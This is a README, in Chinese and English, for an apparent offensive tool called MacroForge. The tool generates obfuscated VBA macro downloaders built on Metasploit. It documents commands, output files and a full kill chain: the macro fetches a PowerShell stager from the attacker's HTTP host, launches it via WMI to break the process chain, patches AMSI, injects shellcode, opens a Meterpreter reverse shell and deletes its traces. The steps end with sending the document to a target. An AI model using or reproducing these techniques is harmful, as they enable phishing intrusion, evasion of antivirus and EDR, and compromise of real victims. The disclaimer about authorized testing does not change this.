# MacroForge v2.0

一款基于 Metasploit 的混淆 VBA 宏 Payload 自动生成器，用于授权渗透测试。一条命令生成分阶段免杀 Office 宏文档，支持 Windows 和 Kali Linux。

An obfuscated VBA macro payload generator built on Metasploit for authorized pentesting. One command to produce staged, AV-evasive Office macro documents. Works on both Windows and Kali Linux.

## Features 功能

- **4 种加密方式** — Caesar / XOR / Base64反转 / CharCode 偏移，默认随机选择，每次输出不同签名
- **全随机化** — 函数名、变量名、临时文件名、分发文件名全部随机生成，每次输出完全不同的签名
- **WMI 执行** — 通过 `Win32_Process.Create` 启动 PowerShell，断开 Word→PS 父子进程链，绕过 EDR
- **AMSI 绕过** — 载荷执行前自动 patch AMSI，禁用 PowerShell 内存扫描
- **分阶段投递** — 文档本身不含 shellcode，仅有混淆下载器；真正的载荷托管在攻击机 HTTP 上
- **自动清理** — 宏执行完毕后自动删除 %TEMP% 下的 ps1 文件，减少取证痕迹
- **跨平台** — Windows 和 Kali 自动检测 Metasploit 路径
- **多种载荷** — `reverse_tcp` / `reverse_https` / `reverse_http` / `shell_tcp`，支持 x86 和 x64

## Requirements 环境

- Python 3.6+
- Metasploit Framework（自动检测路径）

## Quick Start 快速开始

```bash
# 默认生成全套 (x64, reverse_tcp, 端口 4444)
python MacroForge.py --lhost 10.10.16.7

# 生成后自动开 HTTP 服务 (默认 8080)
python MacroForge.py --lhost 10.10.16.7 --serve

# 指定 HTTP 端口
python MacroForge.py --lhost 10.10.16.7 --serve 8081

# 一键全自动：生成 + HTTP + msfconsole 监听
python MacroForge.py --lhost 10.10.16.7 --serve --listen
```

## Usage 用法

```
python MacroForge.py --lhost <IP> [options]

必填:
  --lhost          监听 IP

可选:
  --lport          监听端口 (默认 4444)
  --http-port      HTTP 分发端口 (默认 8080)
  --arch           目标架构 x86|x64 (默认 x64)
  --payload        载荷类型 (默认 reverse_tcp)
                     reverse_tcp | reverse_https | reverse_http | shell_tcp
  --msf-path       Metasploit 路径 (默认自动检测)
  --output-dir     输出目录 (默认当前目录)
  --method         加密方式: caesar|xor|base64|charcode|random (默认 random)
  --shift          加密密钥 (默认每种方法自动生成)
  --serve [PORT]   生成后自动启动 HTTP 服务 (可选端口，如 --serve 8081)
  --listen         自动启动 msfconsole 监听 (配合 --serve)
```

## Examples 示例

```bash
python MacroForge.py --lhost 10.10.16.7 --payload reverse_https --lport 443
python MacroForge.py --lhost 10.10.16.7 --method xor --serve 8081
python MacroForge.py --lhost 10.10.16.7 --method base64 --arch x86
python MacroForge.py --lhost 10.10.16.7 --method charcode --shift 100
python MacroForge.py --lhost 10.10.16.7 --output-dir ./output
```

## Output 输出文件

| 文件 | 说明 |
|------|------|
| `macro.vba` | 混淆 VBA 宏，粘贴到 Word 模块即可 |
| `<random>.ps1` | 含 AMSI 绕过的 PowerShell 载荷，文件名每次随机，放在 HTTP 服务上 |
| `handler.rc` | Metasploit 资源文件，`msfconsole -r handler.rc` 一键监听 |

## Steps 操作步骤

1. **生成载荷** — `python MacroForge.py --lhost 10.10.16.7`
2. **开 HTTP** — `python -m http.server 8080`
3. **开监听** — `msfconsole -r handler.rc`
4. **做文档** — Word → `Alt+F11` → 插入模块 → 粘贴 `macro.vba` → 存为 `.doc`/`.docm`
5. **投递** — 发送文档给目标

## Kill Chain 攻击链

```
目标打开 Word → 宏触发 → 解密函数还原字符串 → XMLHTTP 下载随机命名的 ps1
→ 随机文件名写入 %TEMP% → WMI 启动 PowerShell（父进程为 WMI 非 Word）
→ AMSI bypass → shellcode 内存注入 → Meterpreter 反弹到攻击机
→ 宏自动删除 %TEMP% 下的 ps1 文件
```

## Evasion 免杀总结

| 层级 | 技术 |
|------|------|
| 文档层 | 无 shellcode，仅含混淆下载器 |
| 字符串层 | 4 种加密方式随机切换 (Caesar/XOR/Base64/CharCode) |
| 标识符层 | 函数名/变量名每次随机 |
| 执行层 | WMI 创建进程，断开父子链 |
| PS 层 | 执行前 AMSI bypass |
| 载荷层 | 内存注入，无文件落地 |
| 清理层 | 执行后自动删除 ps1，减少取证痕迹 |

## Disclaimer 免责声明

本工具仅用于授权渗透测试和安全教育。未经授权对非自有系统使用属于违法行为。
This tool is for authorized penetration testing only. Unauthorized use is illegal.
